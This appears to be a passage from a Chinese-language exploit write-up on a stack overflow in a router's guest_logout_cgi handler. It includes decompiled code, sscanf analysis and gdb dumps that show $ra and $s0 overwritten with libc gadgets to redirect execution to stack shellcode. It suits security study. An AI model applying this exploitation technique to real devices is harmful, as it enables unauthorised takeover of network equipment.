
`v10` = `(const char *)get_cgi((int)"cip");` `v11` = `(const char *)get_cgi((int)"submit_button");` `if` `( !v11 )` `v11` = `"";` `if` `( v5 && v10 )` `{` `memset(v29,` `0`,`0x40u`);` `memset(v28,` `0`, sizeof(v28));` `v12` = `fopen("/dev/console","w");` `v13` = `v12;` `if` `( v12 )` `{` `fprintf(v12,"\n  mac=[%s], ip=[%s], submit_button=[%s]\n", v5, v10, v11);` `fclose(v13);` `}` `if` `( VERIFY_MAC_17(v5) && VERIFY_IPv4(v10) )` `{` `if` `( !strstr(v11,"status_guestnet.asp") )` `goto LABEL_31;` `sscanf(v11,"%[^;];%*[^=]=%[^\n]", v29, v28);` `v17` = `fopen("/dev/console","w");` `v18` = `v17;` `if` `( v17 )` `{` `fprintf(` `v17,` `"\n%s(%d),submit_button = [%s] url=[%s], session_id=[%s]\n"`,` "guest_logout_cgi",` `5449`,` v11,` `v29,` `v28);` `fclose(v18);` `}`

`sscanf`这里起到了一个正则的作用，`v11`是我们需要匹配的字符串，`%[^;];%*[^=]=%[^\n]`是匹配规则，`V29`存的是`%[^;]`匹配到的值，`V28`存的是`%*[^=]=%[^\n]`

`%[^;]`：分号前的所有字符都要
`; %*[^=]`：分号后，等号前的字符都不要
`= %[^\n]`：等号后，换行符前的所有字符都要

`v11` = `(const char *)get_cgi((int)"submit_button");`

`v5` = `(const char *)get_cgi((int)"cmac");` `v6` = `(const char *)get_cgi((int)"cip")`

断点下在已经覆盖了`ra`的位置

`b *0x431b60`

```
V0 0x0
V1 0x73
A0 0x4d81f0 (post_buf+64) ◂— 0x75746174 ('tatu')
A1 0x47f785 ◂— 'ogin_guest.asp'
A2 0x0
A3 0x0
T0 0xfd00
T1 0x77a71411 ◂— 0x6c5f5f00
T2 0x77ee5f89 ◂— jalx 0x79957c00
T3 0x77ff5a60 —▸ 0x77a6a000 ◂— 0x464c457f
T4 0x77a6c64c ◂— 0x88e
T5 0x24
T6 0xd80b684
T7 0x77a70b7c ◂— 0x4c475f00
T8 0x77a6c40c ◂— nop
T9 0x77a984d0 (strcoll) ◂— lbu    $v1, ($a0)
S0 0x77aa7050 (xdr_free+16) ◂— move   $t9, $a0 // jmp $a0
S1 0x61616161 ('aaaa')
S2 0x61616161 ('aaaa')
S3 0x61616161 ('aaaa')
S4 0x61616161 ('aaaa')
S5 0x61616161 ('aaaa')
S6 0x61616161 ('aaaa')
S7 0x61616161 ('aaaa')
S8 0x61616161 ('aaaa')
FP 0x7fff1348 ◂— 0x61616161 ('aaaa')
SP 0x7fff1260 —▸ 0x47c14c ◂— 'http_client_ip'
PC 0x431b60 (guest_logout_cgi+872) ◂— jr     $ra
───────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────
0x431b4c <guest_logout_cgi+852>    lw     $s3, 0xcc($sp)
0x431b50 <guest_logout_cgi+856>    lw     $s2, 0xc8($sp)
0x431b54 <guest_logout_cgi+860>    lw     $s1, 0xc4($sp)
0x431b58 <guest_logout_cgi+864>    lw     $s0, 0xc0($sp)
0x431b5c <guest_logout_cgi+868>    move   $v0, $zero
► 0x431b60 <guest_logout_cgi+872>    jr     $ra <0x77a8f7a0>
↓ 0x431b68 <guest_logout_cgi+880>    lw     $t9, -0x7cc0($gp)
0x431b6c <guest_logout_cgi+884>    nop
0x431b70 <guest_logout_cgi+888>    jalr   $t9
0x431b74 <guest_logout_cgi+892>    move   $a0, $s2
```

**可以看到此时`ra`寄存器的值已经是`0x77a8f7a0` 就是`jalr $s0`，$s0也被我们提前布置好了地址**，覆盖到`PC`可以通过`cyclic`算出来，但覆盖到`S0`需要自己去手动调试，慢慢找它的偏移。

```
V0 0x0
V1 0x73
A0 0x4d81f0 (post_buf+64) ◂— 0x75746174 ('tatu')
A1 0x47f785 ◂— 'ogin_guest.asp'
A2 0x0
A3 0x0
T0 0xfd00
T1 0x77a71411 ◂— 0x6c5f5f00
T2 0x77ee5f89 ◂— jalx 0x79957c00
T3 0x77ff5a60 —▸ 0x77a6a000 ◂— 0x464c457f
T4 0x77a6c64c ◂— 0x88e
T5 0x24
T6 0xd80b684
T7 0x77a70b7c ◂— 0x4c475f00
T8 0x77a6c40c ◂— nop
T9 0x77a984d0 (strcoll) ◂— lbu    $v1, ($a0)
S0 0x77aa7050 (xdr_free+16) ◂— move   $t9, $a0
S1 0x61616161 ('aaaa')
S2 0x61616161 ('aaaa')
S3 0x61616161 ('aaaa')
S4 0x61616161 ('aaaa')
S5 0x61616161 ('aaaa')
S6 0x61616161 ('aaaa')
S7 0x61616161 ('aaaa')
S8 0x61616161 ('aaaa')
FP 0x7fff13a0 ◂— 0x109090c
SP 0x7fff1348 ◂— 0x61616161 ('aaaa')
PC 0x77a8f7a0 (fclose+304) ◂— addiu  $a0, $sp, 0x18
───────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────
► 0x77a8f7a0 <fclose+304>    addiu  $a0, $sp, 0x18 <0x4d81f0>
↓ 0x77a8f7a8 <fclose+312>    jalr   $t9
0x77a8f7ac <fclose+316>    addiu  $a1, $zero, 1
0x77a8f7b0 <fclose+320>    lw     $gp, 0x10($sp)
0x77a8f7b4 <fclose+324>    lhu    $v0, ($s1)
0x77a8f7b8 <fclose+328>    andi   $v0, $v0, 0x4000
0x77a8f7bc <fclose+332>    beqz   $v0, fclose+360 <0x77a8f7d8>
0x77a8f7c0 <fclose+336>    lw     $a2, -0x778c($gp)
0x77a8f7c4 <fclose+340>    lw     $t9, -0x77ac($gp)
0x77a8f7c8 <fclose+344>    jalr   $t9
0x77a8f7cc <fclose+348>    lw     $a0, 8($s1)
────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────
00:0000│ sp 0x7fff1348 ◂— 0x61616161 ('aaaa')
... ↓
06:0018│ 0x7fff1360 ◂— 0x2804ffff
... ↓
```

**这里是把`$sp+0x18`的位置给`a0`寄存器，也就是我们要跳的最后位置**

```
Python 2.7.12 (default, Oct 5 2020, 13:56:01)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> print(hex(0x7fff1348+0x18))
0x7fff1360
看了下地址0x7fff1360没毛病
```
